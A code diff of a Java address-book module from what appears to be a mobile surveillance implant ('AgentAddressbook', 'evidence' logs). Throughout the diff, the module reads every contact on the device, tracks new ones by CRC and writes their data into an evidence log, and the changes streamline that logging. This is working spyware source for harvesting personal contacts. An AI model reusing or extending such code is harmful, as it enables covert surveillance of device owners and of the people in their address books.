@@ -36,9 +36,7 @@ public class ModuleAddressBook extends BaseModule {
 	private static final String TAG = "AgentAddressbook"; //$NON-NLS-1$
 
 	private PickContact contact;
-
 	Markup markupContacts;
-
 	HashMap<Long, Long> contacts; // (contact.id, contact.pack.crc)
 
 	public ModuleAddressBook() {
@@ -74,12 +72,20 @@ public class ModuleAddressBook extends BaseModule {
 					Check.log(TAG + " Error (begin): cannot read markup");//$NON-NLS-1$
 				}
 			}
+		}else{
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (actualStart): no markup");
+			}
 		}
 
 		// if no markup available, create a new empty one
 		if (contacts == null) {
 			contacts = new HashMap<Long, Long>();
 			serializeContacts();
+		}else{
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (actualStart): got serialized contacs from markup");
+			}
 		}
 
 	}
@@ -88,6 +94,9 @@ public class ModuleAddressBook extends BaseModule {
 	 * serialize contacts in the markup
 	 */
 	private void serializeContacts() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (serializeContacts)");
+		}
 		if (Cfg.DEBUG) {
 			Check.ensures(contacts != null, "null contacts"); //$NON-NLS-1$
 		}
@@ -151,6 +160,8 @@ public class ModuleAddressBook extends BaseModule {
 
 		boolean needToSerialize = false;
 
+		final LogR log = new LogR(EvidenceType.ADDRESSBOOK);
+		
 		// for every Contact
 		while (iter.hasNext()) {
 			final Contact c = iter.next();
@@ -170,27 +181,17 @@ public class ModuleAddressBook extends BaseModule {
 					Check.log(TAG + " (go): new contact. " + c);//$NON-NLS-1$
 				}
 				contacts.put(c.getId(), crcNew);
-				saveEvidenceContact(c.getId(), packet);
+				
+				log.write(packet);
+				
 				needToSerialize = true;
 				Thread.yield();
-			}
+			}						
 		}
+		
+		log.close();
 
 		return needToSerialize;
-	}
-
-	/**
-	 * Save evidence AddressBook
-	 * 
-	 * @param c
-	 */
-	private void saveEvidenceContact(long idContact, byte[] packet) {
-
-		// contacts.put(idContact, Encryption.CRC32(packet));
-
-		final LogR log = new LogR(EvidenceType.ADDRESSBOOK);
-		log.write(packet);
-		log.close();
 	}
 
 	/**
